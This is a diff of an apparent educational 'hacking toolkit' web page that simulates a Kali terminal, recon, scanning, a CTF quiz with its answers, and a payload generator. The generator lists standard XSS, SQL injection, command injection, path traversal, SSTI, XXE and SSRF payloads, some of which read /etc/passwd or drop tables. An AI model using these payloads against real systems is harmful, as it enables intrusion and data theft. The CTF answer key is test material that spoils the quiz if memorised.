-  'ps aux':()=>[{c:'s',t:'root 1 /sbin/init'},{c:'',t:'root 423 sshd -D'},{c:'',t:'root 1337 python3 exploit.py'}],
+  'uname -a':()=>[{c:'s',t:'Linux kali 6.5.0-kali3-amd64 #1 SMP x86_64 GNU/Linux'}],
+  ifconfig:()=>[{c:'s',t:'eth0: inet 192.168.1.100  wlan0: inet 192.168.1.102  tun0: 10.10.14.5'}],
+  ls:()=>[{c:'s',t:'Desktop Documents tools wordlists exploits payloads reports jwt_tokens'}],
+  netstat:()=>[{c:'s',t:'tcp 0.0.0.0:22 LISTEN  tcp 0.0.0.0:4444 LISTEN'}],
   sqlmap:()=>[{c:'s',t:'sqlmap/1.7.8'},{c:'c',t:'sqlmap -u "http://target/?id=1" --dbs'},{c:'w',t:'Authorized use only.'}],
   nikto:()=>[{c:'s',t:'Nikto v2.1.6'},{c:'c',t:'nikto -h http://target.com'},{c:'w',t:'Authorized use only.'}],
   hydra:()=>[{c:'s',t:'Hydra v9.5'},{c:'c',t:'hydra -l admin -P rockyou.txt ssh://target'},{c:'w',t:'Written permission required.'}],
   gobuster:()=>[{c:'s',t:'Gobuster v3.6'},{c:'c',t:'gobuster dir -u http://target -w common.txt'}],
-  hashcat:()=>[{c:'s',t:'hashcat v6.2.6'},{c:'c',t:'hashcat -m 0 hash.txt rockyou.txt'},{c:'w',t:'Own hashes only.'}],
-  'airmon-ng':()=>[{c:'w',t:'Found 2 processes.'},{c:'s',t:'phy0 wlan0 ath9k_htc Atheros AR9271'}],
+  hashcat:()=>[{c:'s',t:'hashcat v6.2.6'},{c:'c',t:'hashcat -m 0 hash.txt rockyou.txt'}],
+  'airmon-ng':()=>[{c:'s',t:'phy0 wlan0 ath9k_htc Atheros AR9271'}],
   metasploit:()=>[{c:'s',t:'=[ metasploit v6.3.4 | 2375 exploits ]='},{c:'w',t:'Educational only.'}],
-  msfconsole:()=>[{c:'s',t:'msf6 > use exploit/multi/handler'},{c:'w',t:'Educational reference.'}],
+  msfconsole:()=>[{c:'s',t:'msf6 > use exploit/multi/handler'}],
   clear:()=>'CLR',
+  'ssh-keygen':()=>[{c:'pu',t:'Generating Ed25519 key pair...'},{c:'s',t:'Your public key: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... root@kali'},{c:'c',t:'→ Use the SSH KEY GEN tab for full generation'}],
 };
-function initTerm(){if(TINit)return;TINit=true;addTL('SANDESH KALI TERMINAL v5.0 — Type "help"','s');}
+function initTerm(){if(TINit)return;TINit=true;addTL('SANDESH KALI TERMINAL v6.0 — Type "help"','s');}
 function addTL(text,c=''){
   const el=document.getElementById('mt');if(!el)return;
   const d=document.createElement('div');d.className='tl'+(c?' tl'+c:'');
-  d.textContent=text;   // textContent — safe
+  d.textContent=text;
+  if(c==='pu')d.style.color='var(--pu)';
   el.appendChild(d);el.scrollTop=el.scrollHeight;
 }
 function handleTermKey(e){
@@ -791,23 +1099,24 @@ function handleTermKey(e){
 function runCmd(cmd){
   const lo=cmd.toLowerCase();
   let k=Object.keys(CMDS).find(k=>lo===k||lo.startsWith(k+' '));
-  if(!k&&lo.startsWith('nmap')){
-    const h=cmd.split(' ')[1]||'localhost';addTL('Nmap on '+h+'...','c');
-    [[21,'ftp'],[22,'ssh'],[80,'http'],[443,'https'],[3306,'mysql'],[8080,'http-proxy']].forEach((p,i)=>setTimeout(()=>addTL(p[0]+'/tcp open '+p[1],'s'),i*150));
-    setTimeout(()=>addTL('Nmap done.','w'),1100);ST.s++;updST();return;
+  if(!k&&lo.startsWith('nmap')){const h=cmd.split(' ')[1]||'localhost';addTL('Nmap on '+h+'...','c');[[21,'ftp'],[22,'ssh'],[80,'http'],[443,'https'],[3306,'mysql'],[8080,'http-proxy']].forEach((p,i)=>setTimeout(()=>addTL(p[0]+'/tcp open '+p[1],'s'),i*150));setTimeout(()=>addTL('Nmap done.','w'),1100);ST.s++;updST();return;}
+  if(!k&&lo.startsWith('ping')){const h=cmd.split(' ')[1]||'localhost';addTL('PING '+h,'c');for(let i=1;i<=4;i++)setTimeout(()=>addTL('64 bytes: icmp_seq='+i+' time='+(Math.random()*15+1).toFixed(1)+'ms','s'),i*300);return;}
+  if(!k&&lo.startsWith('jwt-decode')){
+    const parts=(cmd.split(' ')[1]||'').split('.');
+    if(parts.length===3){try{const p=JSON.parse(atob(parts[1]));addTL('JWT Payload: '+JSON.stringify(p),'pu');}catch(e){addTL('Invalid JWT','e');}}
+    else addTL('Usage: jwt-decode <token>','e');return;
   }
-  if(!k&&lo.startsWith('ping')){
-    const h=cmd.split(' ')[1]||'localhost';addTL('PING '+h,'c');
-    for(let i=1;i<=4;i++)setTimeout(()=>addTL('64 bytes from '+h+': icmp_seq='+i+' time='+(Math.random()*15+1).toFixed(1)+'ms','s'),i*300);return;
-  }
+  if(!k&&lo.startsWith('osint')){const u=cmd.split(' ')[1]||'unknown';addTL('[OSINT] Checking: '+u,'pu');addTL('→ Use OSINT tab for full platform scan','c');return;}
   if(!k&&lo.startsWith('whois')){const d=cmd.split(' ')[1]||'example.com';addTL('Registrar: GoDaddy | NS: ns1.'+d,'s');return;}
   if(!k&&(lo.startsWith('curl')||lo.startsWith('wget'))){addTL('HTTP/1.1 200 OK Server: nginx/1.24.0','s');return;}
   if(!k){addTL('bash: '+cmd+': command not found','e');return;}
   const r=CMDS[k]();if(r==='CLR'){document.getElementById('mt').innerHTML='';return;}
-  r.forEach(l=>addTL(l.t,l.c||''));
+  r.forEach(l=>{addTL(l.t,l.c||'');});
 }
-
+ 
+// ============================================================
 // PASSWORD GENERATOR
+// ============================================================
 const WDS=['cyber','hacker','falcon','shield','matrix','ghost','shadow','nexus','storm','viper'];
 function genPwd(){
   const len=parseInt(document.getElementById('plen').value)||24;
@@ -823,8 +1132,7 @@ function genPwd(){
     else{let c='';if(up)c+='ABCDEFGHIJKLMNOPQRSTUVWXYZ';if(lo)c+='abcdefghijklmnopqrstuvwxyz';if(nu)c+='0123456789';if(sy)c+='!@#$%^&*()-_=+[]{}';if(!c)c='abcdefghijklmnopqrstuvwxyz';const a=new Uint32Array(len);crypto.getRandomValues(a);p=Array.from(a).map(v=>c[v%c.length]).join('');}
     pwds.push(p);
   }
-  document.getElementById('pout').textContent=pwds.join('\n');  // textContent — safe
-  ST.p+=qty;updST();
+  document.getElementById('pout').textContent=pwds.join('\n');ST.p+=qty;updST();
   const s=strScore(pwds[0]);
   document.getElementById('pfill').style.cssText='width:'+s.p+'%;background:'+s.col;
   document.getElementById('plbl').style.color=s.col;document.getElementById('plbl').textContent='STRENGTH: '+s.lbl;
@@ -841,29 +1149,31 @@ function chkStr(p){
   document.getElementById('chkd').textContent='Len:'+p.length+(p.length>=16?' OK':' SHORT')+'  Up:'+(/[A-Z]/.test(p)?'Y':'N')+'  Lo:'+(/[a-z]/.test(p)?'Y':'N')+'  Num:'+(/[0-9]/.test(p)?'Y':'N')+'  Sym:'+(/[^A-Za-z0-9]/.test(p)?'Y':'N');
 }
 function copyPwd(){navigator.clipboard.writeText(document.getElementById('pout').textContent).then(()=>{event.target.textContent='COPIED!';setTimeout(()=>event.target.textContent='COPY',1400);});}
-
+ 
+// ============================================================
 // RECON
+// ============================================================
 const RD={
   whois:t=>`WHOIS: ${t}\n${'─'.repeat(34)}\nRegistrar: GoDaddy LLC\nCreated: 2018-03-12\nExpires: 2026-03-12\nNS: ns1.${t}, ns2.${t}\nASN: AS13335 (Cloudflare)`,
-  dns:t=>`DNS: ${t}\n${'─'.repeat(34)}\nA: ${Math.floor(Math.random()*200+10)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}\nMX: mail.${t} (10)\nNS: ns1.${t}, ns2.${t}\nTXT: v=spf1 include:${t} ~all`,
-  subdomain:t=>`SUBDOMAINS: ${t}\n${'─'.repeat(34)}\n[+] www.${t} → 93.184.216.34\n[+] mail.${t} → 93.184.216.35\n[+] admin.${t} → 93.184.216.37 ★\n[+] dev.${t} → 192.168.1.50 ★ INTERNAL LEAK!\n[+] api.${t} → 93.184.216.39`,
-  tech:t=>`TECH: ${t}\n${'─'.repeat(34)}\nServer: nginx/1.24.0\nOS: Ubuntu 22.04\nCMS: WordPress 6.4.2\nJS: React 18 + jQuery 3.7\nCDN: Cloudflare TLS: 1.3`,
+  dns:t=>`DNS: ${t}\n${'─'.repeat(34)}\nA: ${Math.floor(Math.random()*200+10)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}\nMX: mail.${t} (10)\nNS: ns1.${t}\nTXT: v=spf1 include:${t} ~all`,
+  subdomain:t=>`SUBDOMAINS: ${t}\n${'─'.repeat(34)}\n[+] www.${t}\n[+] mail.${t}\n[+] admin.${t} ★\n[+] dev.${t} ★ INTERNAL LEAK!\n[+] api.${t}`,
+  tech:t=>`TECH: ${t}\n${'─'.repeat(34)}\nServer: nginx/1.24.0\nOS: Ubuntu 22.04\nCMS: WordPress 6.4.2\nCDN: Cloudflare TLS: 1.3`,
   headers:t=>`HEADERS: ${t}\n${'─'.repeat(34)}\nServer: nginx/1.24.0\nX-Powered-By: PHP/8.2.0 ← LEAK!\nX-Frame-Options: SAMEORIGIN\nHSTS: max-age=31536000`,
-  osint:t=>`OSINT: ${t}\n${'─'.repeat(34)}\nGoogle: site:${t} inurl:admin → 3 ★\nWayback: 156 snapshots\nGitHub: 3 repos\nLinkedIn: 89 employees`,
-  geo:t=>`GEO IP: ${t}\n${'─'.repeat(34)}\nIP: 93.184.216.34\nCity: Los Angeles\nCountry: United States\nISP: Cloudflare ASN: AS13335`,
+  osint:t=>`OSINT: ${t}\n${'─'.repeat(34)}\nGoogle: site:${t} inurl:admin → 3 ★\nWayback: 156 snapshots\nGitHub: 3 repos exposed\nLinkedIn: 89 employees`,
+  geo:t=>`GEO IP: ${t}\n${'─'.repeat(34)}\nIP: 93.184.216.34\nCity: Los Angeles, US\nISP: Cloudflare ASN: AS13335`,
   shodan:t=>`SHODAN: ${t}\n${'─'.repeat(34)}\nPORT 22 SSH-2.0-OpenSSH_8.9\n  ⚠ Password auth enabled\nPORT 80 nginx/1.24.0\nPORT 443 TLS 1.3 ✓\nPORT 8443 ★ Possible admin`,
 };
 function runRecon(){
   const t=document.getElementById('rt').value.trim()||'example.com',ty=document.getElementById('rtype').value;
   const btn=document.getElementById('rb');btn.disabled=true;btn.textContent='RUNNING...';
   let p=0;const iv=setInterval(()=>{p+=Math.random()*18;if(p>100)p=100;document.getElementById('rp').style.width=p+'%';
-    if(p>=100){clearInterval(iv);btn.disabled=false;btn.textContent='RUN RECON';document.getElementById('rs').textContent='COMPLETE';
-      document.getElementById('ro').textContent=RD[ty]?RD[ty](t):'No data';  // textContent — safe
-      ST.s++;updST();}
+    if(p>=100){clearInterval(iv);btn.disabled=false;btn.textContent='RUN RECON';document.getElementById('rs').textContent='COMPLETE';document.getElementById('ro').textContent=RD[ty]?RD[ty](t):'No data';ST.s++;updST();}
   },140);
 }
-
+ 
+// ============================================================
 // VULN SCANNER
+// ============================================================
 const VDB={
   full:[{s:'critical',t:'SQL Injection',d:'Input not sanitized.',f:'Parameterized queries.'},{s:'critical',t:'File Upload RCE',d:'PHP shell via upload.',f:'Whitelist extensions.'},{s:'high',t:'Reflected XSS',d:'Search param not encoded.',f:'Output encoding + CSP.'},{s:'high',t:'TLS 1.0/1.1',d:'Vulnerable to POODLE.',f:'Disable old TLS.'},{s:'high',t:'Default Credentials',d:'admin:admin works.',f:'Change credentials.'},{s:'medium',t:'Missing Headers',d:'No CSP, HSTS.',f:'Add security headers.'},{s:'medium',t:'Directory Listing',d:'/uploads/ visible.',f:'Disable listing.'},{s:'low',t:'Cookie No HttpOnly',d:'Session cookie exposed.',f:'Set HttpOnly flag.'},{s:'low',t:'CORS Wildcard',d:'* in CORS headers.',f:'Restrict CORS.'}],
   web:[{s:'critical',t:'SQL Injection',d:'Multiple injection points.',f:'Parameterized queries.'},{s:'high',t:'Stored XSS',d:'Persistent XSS.',f:'Output encoding + CSP.'},{s:'medium',t:'CSRF Missing',d:'No CSRF tokens.',f:'Add CSRF protection.'}],
@@ -888,44 +1198,45 @@ function showVulns(ty,t){
   document.getElementById('vres').innerHTML=vs.map(v=>`<div class="vi v${esc(v.s[0])}"><strong style="color:${cm[v.s]}">[${esc(v.s.toUpperCase())}]</strong> ${esc(v.t)}<br><span style="color:#aaa;font-size:10px">${esc(v.d)}</span><br><span style="color:var(--g);font-size:10px">Fix: ${esc(v.f)}</span></div>`).join('');
   ST.s++;updST();
 }
-
+ 
+// ============================================================
 // PACKET ANALYZER
+// ============================================================
 let capIV=null,PKS={tcp:0,udp:0,http:0,dns:0,arp:0,tot:0};
 const PKTS=[
-  {t:'tcp',s:'192.168.1.5',sp:45231,d:'142.250.185.78',dp:443,i:'TLS Application Data',sz:1420},
-  {t:'http',s:'192.168.1.10',sp:52341,d:'93.184.216.34',dp:80,i:'GET /index.html HTTP/1.1',sz:480},
-  {t:'dns',s:'192.168.1.100',sp:53412,d:'8.8.8.8',dp:53,i:'Standard query A google.com',sz:74},
-  {t:'udp',s:'192.168.1.5',sp:5353,d:'224.0.0.251',dp:5353,i:'mDNS query _services',sz:80},
-  {t:'arp',s:'192.168.1.1',sp:0,d:'ff:ff:ff:ff:ff:ff',dp:0,i:'Who has 192.168.1.100?',sz:42},
-  {t:'tcp',s:'10.0.0.5',sp:4444,d:'192.168.1.100',dp:1337,i:'[SYN] Suspicious ★',sz:60,alert:true},
-  {t:'http',s:'192.168.1.7',sp:43210,d:'192.168.1.1',dp:8080,i:'POST /admin/login ★',sz:320,alert:true},
+  {t:'tcp',s:'192.168.1.5',dp:443,i:'TLS Application Data'},
+  {t:'http',s:'192.168.1.10',dp:80,i:'GET /index.html HTTP/1.1'},
+  {t:'dns',s:'192.168.1.100',dp:53,i:'Standard query A google.com'},
+  {t:'udp',s:'192.168.1.5',dp:5353,i:'mDNS query _services'},
+  {t:'arp',s:'192.168.1.1',dp:0,i:'Who has 192.168.1.100?'},
+  {t:'tcp',s:'10.0.0.5',dp:1337,i:'[SYN] Suspicious ★',alert:true},
+  {t:'http',s:'192.168.1.7',dp:8080,i:'POST /admin/login ★',alert:true},
 ];
 function startCap(){
   const fil=document.getElementById('pfil').value;
   PKS={tcp:0,udp:0,http:0,dns:0,arp:0,tot:0};
-  document.getElementById('pkfeed').innerHTML='';
-  document.getElementById('palerts').textContent='';
-  document.getElementById('capb').disabled=true;
-  document.getElementById('stopb').disabled=false;
+  document.getElementById('pkfeed').innerHTML='';document.getElementById('palerts').textContent='';
+  document.getElementById('capb').disabled=true;document.getElementById('stopb').disabled=false;
   document.getElementById('cind').style.display='inline';
   capIV=setInterval(()=>{
     const pk=PKTS[Math.floor(Math.random()*PKTS.length)];
     if(fil!=='all'&&pk.t!==fil)return;
-    PKS[pk.t]=(PKS[pk.t]||0)+1;PKS.tot++;
-    updPKS();
+    PKS[pk.t]=(PKS[pk.t]||0)+1;PKS.tot++;updPKS();
     const feed=document.getElementById('pkfeed');
     const dv=document.createElement('div');dv.className='pkt pkt-'+pk.t;
     const tm=new Date().toTimeString().split(' ')[0];
     const COL={tcp:'var(--g)',udp:'var(--c)',http:'var(--y)',dns:'var(--pu)',arp:'var(--r)'};
-    dv.textContent=`${tm} [${pk.t.toUpperCase()}] ${pk.s}→${pk.d}:${pk.dp} ${pk.i}`;  // textContent — safe
+    dv.innerHTML=`<span style="color:#00ff4155">${esc(tm)}</span> <span style="color:${COL[pk.t]}">[${esc(pk.t.toUpperCase())}]</span> ${esc(pk.s)}:${esc(String(pk.dp))} <span style="color:#999">${esc(pk.i)}</span>`;
     feed.appendChild(dv);feed.scrollTop=feed.scrollHeight;
     if(pk.alert)document.getElementById('palerts').textContent+='⚠ '+pk.i+'\n';
   },600);
 }
 function stopCap(){clearInterval(capIV);document.getElementById('capb').disabled=false;document.getElementById('stopb').disabled=true;document.getElementById('cind').style.display='none';}
 function updPKS(){['tcp','udp','http','dns','arp'].forEach(k=>document.getElementById('s'+k).textContent=PKS[k]||0);document.getElementById('stot').textContent=PKS.tot;}
-
+ 
+// ============================================================
 // NETWORK MAP
+// ============================================================
 let NMC,NMX;
 function initNMC(){
   NMC=document.getElementById('nmc');NMX=NMC.getContext('2d');
@@ -941,14 +1252,7 @@ function runNetMap(){
   },180);
 }
 function drawNM(){
-  const H=[
-    {ip:'192.168.1.1',n:'Router',col:'#ffe600',ports:[80,443,22]},
-    {ip:'192.168.1.5',n:'Win PC',col:'#00aaff',ports:[135,445,3389]},
-    {ip:'192.168.1.10',n:'Linux',col:'#00ff41',ports:[22,80,443]},
-    {ip:'192.168.1.15',n:'Phone',col:'#ff6600',ports:[5555]},
-    {ip:'192.168.1.20',n:'IoT TV',col:'#ff003c',ports:[8008]},
-    {ip:'192.168.1.100',n:'Kali',col:'#00eeff',ports:[22,4444]},
-  ];
+  const H=[{ip:'192.168.1.1',n:'Router',col:'#ffe600',ports:[80,443,22]},{ip:'192.168.1.5',n:'Win PC',col:'#00aaff',ports:[135,445,3389]},{ip:'192.168.1.10',n:'Linux',col:'#00ff41',ports:[22,80,443]},{ip:'192.168.1.15',n:'Phone',col:'#ff6600',ports:[5555]},{ip:'192.168.1.20',n:'IoT',col:'#ff003c',ports:[8008]},{ip:'192.168.1.100',n:'Kali',col:'#00eeff',ports:[22,4444]},];
   document.getElementById('nmh').innerHTML=H.map(h=>`<div style="padding:3px 6px;border-left:2px solid ${esc(h.col)};margin-bottom:3px;font-size:10px"><span style="color:${esc(h.col)}">${esc(h.ip)}</span> ${esc(h.n)} <span style="color:#00ff4155">[${esc(h.ports.join(','))}]</span></div>`).join('');
   if(!NMX)initNMC();
   NMX.fillStyle='#000';NMX.fillRect(0,0,NMC.width,NMC.height);
@@ -963,12 +1267,14 @@ function drawNM(){
     NMX.fillStyle='#00ff4188';NMX.font='9px Share Tech Mono';NMX.fillText(h.n,h.x,h.y+26);
   });
 }
-
-// ── CTF LAB ──────────────────────────────────────────────────────────────────
+ 
+// ============================================================
+// CTF LAB
+// ============================================================
 const CTFS=[
   {id:1,cat:'CRYPTO',title:'Base64 Secret',pts:50,diff:'EASY',desc:'Decode:\nU2FuZGVzaCBFdGhpY2FsIEhhY2tpbmcgVG9vbHM=',hint:'Use a Base64 decoder.',check:t=>t.toLowerCase().includes('sandesh'),flag:'FLAG{base64_decoded}'},
   {id:2,cat:'CRYPTO',title:'Caesar Cipher',pts:75,diff:'EASY',desc:'Decrypt (shift 3):\nVhqhvk Hwklfdo Kdflnlqj',hint:'Shift each letter back by 3.',check:t=>t.toLowerCase().includes('sandesh'),flag:'FLAG{Sandesh_Ethical}'},
-  {id:3,cat:'WEB',title:'XSS Basic',pts:100,diff:'EASY',desc:'What does XSS stand for?\nThen what tag is used to run scripts?\nAnswer: FLAG{tag_name}',hint:'Cross Site Scripting uses script tags.',check:t=>t.toLowerCase().includes('script'),flag:'FLAG{script_tag}'},
+  {id:3,cat:'WEB',title:'XSS Basic',pts:100,diff:'EASY',desc:'What does XSS stand for?\nWhat HTML tag runs scripts?\nAnswer: FLAG{tag_name}',hint:'Cross Site Scripting uses script tags.',check:t=>t.toLowerCase().includes('script'),flag:'FLAG{script_tag}'},
   {id:4,cat:'WEB',title:'SQL Auth Bypass',pts:125,diff:'MEDIUM',desc:"What SQL keyword bypasses login?\nExample: admin' [KEYWORD] 1=1--\nFLAG{keyword}",hint:'The keyword means OR in logic.',check:t=>t.toLowerCase().includes('or'),flag:'FLAG{OR_bypass}'},
   {id:5,cat:'FORENSICS',title:'MD5 Crack',pts:150,diff:'MEDIUM',desc:'Crack this MD5:\n5f4dcc3b5aa765d61d8327deb882cf99\nFLAG{plaintext}',hint:'Very common password.',check:t=>t.toLowerCase().includes('password'),flag:'FLAG{password}'},
   {id:6,cat:'NETWORK',title:'Port 22 Service',pts:100,diff:'EASY',desc:'Service on port 22?\nFLAG{service}',hint:'Secure remote login.',check:t=>t.toLowerCase().includes('ssh'),flag:'FLAG{ssh}'},
@@ -977,51 +1283,38 @@ const CTFS=[
   {id:9,cat:'NETWORK',title:'Nmap SYN Scan',pts:100,diff:'EASY',desc:'Nmap stealth SYN scan flag?\nFLAG{flag}',hint:'Capital S with dash.',check:t=>t.toLowerCase().includes('ss')||t.includes('sS'),flag:'FLAG{-sS}'},
   {id:10,cat:'CRYPTO',title:'ROT13',pts:50,diff:'EASY',desc:'Decode ROT13:\nFnaqrfu Unpxre',hint:'Rotate letters by 13.',check:t=>t.toLowerCase().includes('sandesh'),flag:'FLAG{Sandesh_Hacker}'},
   {id:11,cat:'WEB',title:'SSRF AWS',pts:200,diff:'HARD',desc:'AWS metadata IP for SSRF?\nFLAG{ip_address}',hint:'169.254.x.x range.',check:t=>t.includes('169.254'),flag:'FLAG{169.254.169.254}'},
-  {id:12,cat:'FORENSICS',title:'PNG Magic Bytes',pts:175,diff:'MEDIUM',desc:'PNG file first magic byte in hex?\nFLAG{byte}',hint:'Starts with 89.',check:t=>t.includes('89'),flag:'FLAG{89_50_4E_47}'},
+  {id:12,cat:'JWT',title:'JWT alg:none',pts:175,diff:'HARD',desc:'In a JWT attack, what algorithm value removes signature verification?\nFLAG{algorithm}',hint:'The algorithm is the absence of one.',check:t=>t.toLowerCase().includes('none'),flag:'FLAG{none}'},
 ];
-let ctfScore=0,ctfSolved=new Set(lsG('ctf5_solved',[])),activeCTF=null;
-
+let ctfScore=0,ctfSolved=new Set(lsG('ctf6_solved',[])),activeCTF=null;
 function buildCTF(){
-  ctfScore=lsG('ctf5_score',0);
+  ctfScore=lsG('ctf6_score',0);
   document.getElementById('ctfscore').textContent=ctfScore;
   document.getElementById('ctfsc').textContent=ctfSolved.size;
-  // ── FIX 1: use esc() on all user-derived / CTF text inserted via innerHTML ──
   document.getElementById('ctflist').innerHTML=CTFS.map(c=>`<div class="ctfc${ctfSolved.has(c.id)?' solved':''}" onclick="openCTF(${c.id})" id="ctfc${c.id}">
     <span style="font-size:9px;color:${ctfSolved.has(c.id)?'var(--g)':c.diff==='HARD'?'var(--r)':c.diff==='MEDIUM'?'var(--y)':'var(--c)'}">[${esc(c.diff)}] ${esc(c.cat)}</span>${ctfSolved.has(c.id)?' ✓':''}<br>
     <span style="font-size:12px;color:var(--g)">${esc(c.title)}</span>
     <span style="float:right;color:var(--y);font-size:11px">${c.pts}pts</span>
   </div>`).join('');
 }
-
 function openCTF(id){
   activeCTF=CTFS.find(c=>c.id===id);
   document.querySelectorAll('.ctfc').forEach(c=>c.classList.remove('act'));
   const el=document.getElementById('ctfc'+id);if(el)el.classList.add('act');
   const solved=ctfSolved.has(id);
-  // ── FIX 1: desc is plain text — use textContent for the body, esc() for labels ──
-  const workEl=document.getElementById('ctfwork');
-  workEl.innerHTML=
+  document.getElementById('ctfwork').innerHTML=
     '<div style="color:var(--c);font-family:Orbitron,sans-serif;font-size:11px;margin-bottom:8px">['+esc(activeCTF.cat)+'] '+esc(activeCTF.title)+' — '+activeCTF.pts+'pts</div>'+
     '<div style="color:var(--y);font-size:9px;margin-bottom:10px">Difficulty: '+esc(activeCTF.diff)+'</div>'+
-    '<div id="ctfdesc" style="color:var(--g);line-height:1.8;white-space:pre-wrap"></div>'+
+    '<div style="color:var(--g);line-height:1.8;white-space:pre-wrap">'+esc(activeCTF.desc)+'</div>'+
     (solved?'<div style="color:var(--g);margin-top:10px;font-size:11px">SOLVED! '+esc(activeCTF.flag)+'</div>':'');
-  // Set desc via textContent — prevents any script in desc from executing
-  document.getElementById('ctfdesc').textContent=activeCTF.desc;
   document.getElementById('ctfans').value='';
   document.getElementById('ctffb').textContent='';
 }
-
-// ── FIX 2: closing brace was missing — submitCTF and ctfHint were merged ──
 function submitCTF(){
   if(!activeCTF){document.getElementById('ctffb').textContent='Select a challenge first.';return;}
   const ans=document.getElementById('ctfans').value.trim();
   const ok=activeCTF.check?activeCTF.check(ans):(ans.toLowerCase()===activeCTF.flag.toLowerCase());
   if(ok){
-    if(!ctfSolved.has(activeCTF.id)){
-      ctfSolved.add(activeCTF.id);ctfScore+=activeCTF.pts;
-      ST.c++;ST.g=Math.max(ST.g,ctfScore);
-      lsS('ctf5_solved',[...ctfSolved]);lsS('ctf5_score',ctfScore);updST();
-    }
+    if(!ctfSolved.has(activeCTF.id)){ctfSolved.add(activeCTF.id);ctfScore+=activeCTF.pts;ST.c++;ST.g=Math.max(ST.g,ctfScore);lsS('ctf6_solved',[...ctfSolved]);lsS('ctf6_score',ctfScore);updST();}
     document.getElementById('ctffb').style.color='var(--g)';
     document.getElementById('ctffb').textContent='CORRECT! +'+activeCTF.pts+'pts — '+activeCTF.flag;
     buildCTF();openCTF(activeCTF.id);
@@ -1029,15 +1322,17 @@ function submitCTF(){
     document.getElementById('ctffb').style.color='var(--r)';
     document.getElementById('ctffb').textContent='Wrong. Click HINT for help.';
   }
-}  // ← this closing brace was absent in the original, causing ctfHint to be swallowed
-
+}
+// FIX: ctfHint is properly a standalone function
 function ctfHint(){
   if(!activeCTF)return;
   document.getElementById('ctffb').style.color='var(--y)';
   document.getElementById('ctffb').textContent='HINT: '+activeCTF.hint;
 }
-
+ 
+// ============================================================
 // DARK WEB MONITOR
+// ============================================================
 const BLIST=[
   {name:'RockYou2024',date:'2024-07-04',records:'9.9B',type:'Passwords',sev:'critical'},
   {name:'AT&T Breach',date:'2024-07-12',records:'110M',type:'Phone/SSN/DOB',sev:'critical'},
@@ -1045,11 +1340,7 @@ const BLIST=[
   {name:'Ticketmaster',date:'2024-05-20',records:'560M',type:'Personal+Payment',sev:'high'},
   {name:'Facebook 2021',date:'2021-04-03',records:'533M',type:'Phone/Email',sev:'medium'},
 ];
-function buildBreaches(){
-  document.getElementById('breachlist').innerHTML=BLIST.map(b=>
-    `<div style="padding:5px 8px;border:1px solid ${b.sev==='critical'?'#ff003c33':b.sev==='high'?'#ffe60033':'#00ff4133'};margin-bottom:4px;font-size:10px;background:${b.sev==='critical'?'#1a0000':b.sev==='high'?'#1a1000':'#001500'}"><span style="color:${b.sev==='critical'?'var(--r)':b.sev==='high'?'var(--y)':'var(--c)'}">${esc(b.name)}</span> ${esc(b.date)}<br>${esc(b.records)} — ${esc(b.type)}</div>`
-  ).join('');
-}
+function buildBreaches(){document.getElementById('breachlist').innerHTML=BLIST.map(b=>`<div style="padding:5px 8px;border:1px solid ${b.sev==='critical'?'#ff003c33':b.sev==='high'?'#ffe60033':'#00ff4133'};margin-bottom:4px;font-size:10px;background:${b.sev==='critical'?'#1a0000':b.sev==='high'?'#1a1000':'#001500'}"><span style="color:${b.sev==='critical'?'var(--r)':b.sev==='high'?'var(--y)':'var(--c)'}">${esc(b.name)}</span> ${esc(b.date)}<br>${esc(b.records)} — ${esc(b.type)}</div>`).join('');}
 function checkBreach(){
   let p=0;document.getElementById('bprog').style.width='0%';document.getElementById('bres').innerHTML='';
   const iv=setInterval(()=>{p+=Math.random()*15;if(p>100)p=100;document.getElementById('bprog').style.width=p+'%';
@@ -1058,20 +1349,22 @@ function checkBreach(){
 }
 function showBreachRes(email){
   const found=[{src:'LinkedIn 2021',type:'Email+Password',date:'2021-06-22'},{src:'Adobe 2013',type:'Email+Hash',date:'2013-10-04'},{src:'Dropbox 2012',type:'Email+Hash',date:'2012-07-01'}];
-  document.getElementById('bres').innerHTML=`<div style="font-size:11px;margin-bottom:8px;color:var(--r)">⚠ ${found.length} breaches found for ${esc(email)}</div>`+found.map(b=>`<div class="bri brf"><strong>${esc(b.src)}</strong> — ${esc(b.type)}<br>${esc(b.date)} ⚠ Change password!</div>`).join('')+`<div style="margin-top:8px;font-size:10px;color:var(--y)">⚠ Change passwords immediately!</div>`;
+  document.getElementById('bres').innerHTML=`<div style="font-size:11px;margin-bottom:8px;color:var(--r)">⚠ ${found.length} breaches found for ${esc(email)}</div>`+found.map(b=>`<div class="bri brf"><strong>${esc(b.src)}</strong> — ${esc(b.type)}<br>${esc(b.date)}</div>`).join('')+`<div style="margin-top:8px;font-size:10px;color:var(--y)">⚠ Change passwords immediately!</div>`;
 }
-
+ 
+// ============================================================
 // PAYLOAD GENERATOR
+// ============================================================
 const PDATA={
-  xss:['<script>alert(1)<\/script>','<img src=x onerror=alert(1)>','<svg onload=alert(1)>','javascript:alert(1)','<body onload=alert(1)>','"><script>alert(document.cookie)<\/script>'],
-  sqli:["' OR '1'='1","' OR 1=1--","admin'--","' UNION SELECT null,null,null--","' AND SLEEP(5)--","1; DROP TABLE users--"],
-  rce:[';id','|id','&&id','`id`','$(id)','; cat /etc/passwd','| whoami'],
-  lfi:['../../../etc/passwd','..%2F..%2Fetc%2Fpasswd','....//....//etc/passwd','php://filter/convert.base64-encode/resource=index.php'],
-  ssti:['{{7*7}}','${7*7}','<%= 7*7 %>','{{config}}','#{7*7}'],
+  xss:['<script>alert(1)<\/script>','<img src=x onerror=alert(1)>','<svg onload=alert(1)>','javascript:alert(1)','<body onload=alert(1)>'],
+  sqli:["' OR '1'='1","' OR 1=1--","admin'--","' UNION SELECT null,null,null--","' AND SLEEP(5)--"],
+  rce:[';id','|id','&&id','`id`','$(id)','; cat /etc/passwd'],
+  lfi:['../../../etc/passwd','..%2F..%2Fetc%2Fpasswd','....//....//etc/passwd'],
+  ssti:['{{7*7}}','${7*7}','<%= 7*7 %>','{{config}}'],
   xxe:['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
   ssrf:['http://169.254.169.254/latest/meta-data/','http://localhost:22','http://127.0.0.1/admin'],
